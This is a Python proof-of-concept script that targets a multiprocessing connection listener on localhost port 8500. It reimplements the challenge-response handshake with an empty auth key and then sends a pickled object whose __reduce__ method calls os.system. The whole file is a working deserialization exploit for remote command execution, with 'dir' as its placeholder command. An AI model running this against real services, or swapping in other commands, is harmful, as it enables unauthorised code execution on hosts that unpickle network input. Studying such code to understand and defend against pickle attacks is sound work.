import os
import io
import pickle
import socket
import struct

MESSAGE_LENGTH = 20

CHALLENGE = b'#CHALLENGE#'
WELCOME = b'#WELCOME#'
FAILURE = b'#FAILURE#'

def deliver_challenge(io, authkey):
    import hmac
    if not isinstance(authkey, bytes):
        raise ValueError(
            "Authkey must be bytes, not {0!s}".format(type(authkey)))
    message = os.urandom(MESSAGE_LENGTH)
    send_bytes(io, CHALLENGE + message)
    digest = hmac.new(authkey, message, 'md5').digest()
    response = recv_bytes(io, 256)        # reject large message
    if response == digest:
        send_bytes(io, WELCOME)
    else:
        send_bytes(io, FAILURE)
        # raise AuthenticationError('digest received was wrong')

def answer_challenge(io, authkey):
    import hmac
    if not isinstance(authkey, bytes):
        raise ValueError(
            "Authkey must be bytes, not {0!s}".format(type(authkey)))
    message = recv_bytes(io, 256)         # reject large message
    assert message[:len(CHALLENGE)] == CHALLENGE, 'message = %r' % message
    message = message[len(CHALLENGE):]
    print(message)
    digest = hmac.new(authkey, message, 'md5').digest()
    print(digest)
    send_bytes(io, digest)
    response = recv_bytes(io, 256)        # reject large message
    if response != WELCOME:
        # raise AuthenticationError('digest sent was rejected')
        pass

def send_bytes(io, buf):
    n = len(buf)
    if n > 0x7fffffff:
        pre_header = struct.pack("!i", -1)
        header = struct.pack("!Q", n)
        io.send(pre_header)
        io.send(header)
        io.send(buf)
    else:
        # For wire compatibility with 3.7 and lower
        header = struct.pack("!i", n)
        if n > 16384:
            # The payload is large so Nagle's algorithm won't be triggered
            # and we'd better avoid the cost of concatenation.
            io.send(header)
            io.send(buf)
        else:
            # Issue #20540: concatenate before sending, to avoid delays due
            # to Nagle's algorithm on a TCP socket.
            # Also note we want to avoid sending a 0-length buffer separately,
            # to avoid "broken pipe" errors if the other end closed the pipe.
            io.send(header + buf)

def recv_bytes(io, maxsize=None):
    buf = io.recv(4)
    size, = struct.unpack("!i", buf)
    if size == -1:
        buf = io.recv(8)
        size, = struct.unpack("!Q", buf)
    if maxsize is not None and size > maxsize:
        return None
    return io.recv(size)

# answer_challenge(c, authkey)
# deliver_challenge(c, authkey)


class POC():

    def __reduce__(self):
        print(1)
        return (os.system,('dir',))


ip_port = ('127.0.0.1', 8500)
io = socket.socket()
io.connect(ip_port)

answer_challenge(io, b'')
deliver_challenge(io, b'')
poc = POC()
send_bytes(io, pickle.dumps(poc))
